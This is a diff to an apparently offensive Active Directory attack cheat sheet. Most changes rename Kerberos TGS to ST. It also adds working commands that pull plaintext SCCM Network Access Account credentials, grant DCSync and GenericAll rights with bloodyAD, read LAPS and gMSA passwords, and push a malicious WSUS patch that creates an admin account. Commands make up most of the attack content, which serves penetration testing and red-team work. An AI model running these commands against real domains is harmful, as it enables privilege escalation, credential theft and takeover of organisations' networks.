@@ -113,6 +113,7 @@
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [PrivExchange attack](#privexchange-attack)
     - [SCCM Deployment](#sccm-deployment)
+    - [SCCM Network Access Accounts](#sccm-network-access-accounts)
     - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -720,7 +721,7 @@ Requirements:
 
 #### samAccountName spoofing
 
-> During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a TGS to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid TGS for the domain controller.
+> During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.
 
 **Requirements**
 
@@ -1669,7 +1670,7 @@ Mitigations:
 
 ### Pass-the-Ticket Silver Tickets
 
-Forging a TGS require machine account password (key) or NTLM hash of the service account.
+Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
 
 ```powershell
 # Create a ticket for the service
@@ -1706,7 +1707,7 @@ Mitigations:
 
 > "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)
 
-Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
+Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
 
 * [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
@@ -2224,7 +2225,7 @@ secretsdump.py -k -no-pass target.lab.local
 * Find ADCS Server
   * `crackmapexec ldap domain.lab -u username -p password -M adcs`
   * `ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName`
-* Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`
+* Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`, `certutil -dump`
 
 #### ESC1 - Misconfigured Certificate Templates
 
@@ -2649,10 +2650,10 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
   # Get a TGT using the newly acquired certificate via PKINIT 
   proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
 
-  # Get a TGS for the target account 
+  # Get a ST (service ticket) for the target account 
   proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
 
-  # Utilize the TGS for future activity 
+  # Utilize the ST for future activity 
   export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
   proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
   ```
@@ -2750,7 +2751,7 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 		* using bloodyAD: 
 		`bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'`
 
-* **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a TGS, then grab its hash and kerberoast it.
+* **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
   ```powershell
   # Check for interesting permissions on accounts:
   Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
@@ -2855,10 +2856,10 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   	* On Linux:
   	```bash
 	# Give DCSync right to the principal identity
-	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2
 	
 	# Remove right after DCSync
-	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False
 	```
   
 * WriteDACL on Group
@@ -2866,6 +2867,13 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
   net group "INTERESTING_GROUP" User1 /add /domain
   ```
+  Or  
+  ```powershell
+  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
+  
+  # Remove right
+  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
+	```
 
 #### WriteOwner
 
@@ -2873,6 +2881,10 @@ An attacker can update the owner of the target object. Once the object owner has
 
 ```powershell
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+Or  
+```powershell
+bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
 ```
 
 This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
@@ -2884,6 +2896,10 @@ An attacker can read the LAPS password of the computer account this ACE applies 
 
 ```powershell
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
+Or for a given computer  
+```powershell
+bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```
 
 
@@ -2898,6 +2914,10 @@ $mp = $gmsa.'msDS-ManagedPassword'
 
 # Decode the data structure using the DSInternals module
 ConvertFrom-ADManagedPasswordBlob $mp
+```
+Or  
+```powershell
+python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
 ```
 
 #### ForceChangePassword
@@ -3116,14 +3136,14 @@ mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /
 mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
 ```
 
-#### Use the Trust Ticket file to get a TGS for the targeted service
+#### Use the Trust Ticket file to get a ST for the targeted service
 
 ```powershell
 .\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
 .\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
 
-Inject the TGS file and access the targeted service with the spoofed rights.
+Inject the ST file and access the targeted service with the spoofed rights.
 
 ```powershell
 kirbikator lsa .\ticket.kirbi
@@ -3160,7 +3180,7 @@ If we compromise the bastion we get `Domain Admins` privileges on the other doma
 
 ### Kerberos Unconstrained Delegation
 
-> The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
+> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
 
 > When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. 
 
@@ -3317,7 +3337,7 @@ PS> ls \\dc01.offense.local\c$
 
 Resource-based Constrained Delegation was introduced in Windows Server 2012. 
 
-> The user sends a TGS to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+> The user sends a Service Ticket (ST) to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
 
 1. Import **Powermad** and **Powerview**
 
@@ -3521,7 +3541,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
     ```
 * Compromise management server, use locate to find primary server
-* use Inspect on primary server to view who you can target
+* Use `inspect` on primary server to view who you can target
     ```ps1
     MalSCCM.exe inspect /all
     MalSCCM.exe inspect /computers
@@ -3560,6 +3580,28 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     MalSCCM.exe group /delete /groupname:TargetGroup
     ```
 
+
+### SCCM Network Access Accounts
+
+> If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.
+
+* Find SCCM blob
+    ```ps1
+    Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
+    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
+    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
+    ```
+* Using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) for SCCM retrieval and decryption
+    ```ps1
+    .\SharpDPAPI.exe SCCM
+    ```
+* Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
+    ```ps1
+    Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
+    ConvertFrom-SddlString ""
+    ```
+
+
 ### WSUS Deployment
 
 > Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network
@@ -3570,7 +3612,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 
 1. Locate using `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` or `SharpWSUS.exe locate`
 2. After WSUS Server compromise: `SharpWSUS.exe inspect`
-3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
+3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
 4. Deploy it on the target: `SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
 5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
 6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`
@@ -3929,3 +3971,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
 * [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
 * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
+* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
